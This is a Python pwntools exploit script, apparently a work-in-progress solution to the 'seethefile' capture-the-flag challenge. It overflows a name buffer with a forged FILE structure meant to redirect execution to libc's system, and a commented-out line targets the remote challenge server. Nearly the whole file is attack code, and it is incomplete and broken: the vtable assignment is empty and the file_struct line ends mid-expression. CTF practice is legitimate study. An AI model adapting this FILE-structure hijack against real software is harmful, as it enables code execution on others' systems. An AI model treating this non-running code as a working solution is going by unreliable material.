from pwn import *

def p32(d):
    return d.to_bytes(4, "little")

bin     = elf.ELF("./seethefile")
#libc    = elf.ELF("./libc.so.6")
libc    = elf.ELF("/lib32/libc.so.6")

libc_base = 0xf7deb000 
libc_sys = libc_base + libc.symbols[b"system"]
libc_nullp = libc_base + libc.symbols[b"_null_auth"]

#r = process("./seethefile")
r = process(["gdbserver", "localhost:1234", "./seethefile"])
#r=remote("chall.pwnable.tw", port=10200)

name = 0x0804B260
after = 0x0804B284
main = 0x08048A37

vtable = 

file_struct = b"A" * 72 + p32(libc_nullp) + b"A" * (148 - 72 - 4) + 

payload = b"A" * 32 + p32(after) + file_struct

r.sendline("5")
r.sendline(payload)
r.interactive()

#0xffffd1e0 + 12 is first 